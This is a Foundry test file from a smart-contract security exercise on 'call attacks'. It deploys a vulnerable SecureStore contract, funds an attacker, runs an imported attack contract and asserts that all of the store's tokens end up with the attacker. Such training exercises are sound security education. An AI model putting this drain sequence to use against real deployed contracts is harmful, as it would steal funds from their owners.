// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../../src/18. Call Attacks-2/SecureStore.sol";
import "../../src/18. Call Attacks-2/RentingLibrary.sol";
import "../../src/18. Call Attacks-2/AttackSecureStore.sol";
import "../../src/Utils/DummyERC20.sol";

contract TestCA2 is Test {
    SecureStore store;
    RentingLibrary rLibrary;
    DummyERC20 usdc;
    AttackSecureStore attackContract;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant INITIAL_SUPPLY = 100 ether;
    uint256 constant ATTACKER_INITIAL_BALANCE = 100 ether;
    uint256 constant STORE_INITIAL_BALANCE = 10000 ether;
    uint256 constant DAILY_RENT_PRICE = 50 ether;

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        vm.deal(deployer, STORE_INITIAL_BALANCE);
        vm.deal(attacker, ATTACKER_INITIAL_BALANCE);

        // Deploy Contracts
        vm.startPrank(deployer);
        rLibrary = new RentingLibrary();

        // Deploy Token
        usdc = new DummyERC20("USDC Token", "USDC", INITIAL_SUPPLY);

        store = new SecureStore(address(rLibrary), DAILY_RENT_PRICE, address(usdc));

        // Setting up the attacker
        usdc.mint(attacker, ATTACKER_INITIAL_BALANCE);

        // Setting up the SecureStore
        usdc.mint(address(store), STORE_INITIAL_BALANCE);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        attackContract = new AttackSecureStore(address(usdc), address(store));
        usdc.transfer(address(attackContract), ATTACKER_INITIAL_BALANCE);
        attackContract.attack();

        store.withdrawAll();

        vm.stopPrank();

        assertEq(usdc.balanceOf(address(store)), 0);
        assertEq(usdc.balanceOf(attacker), ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE);
    }
}
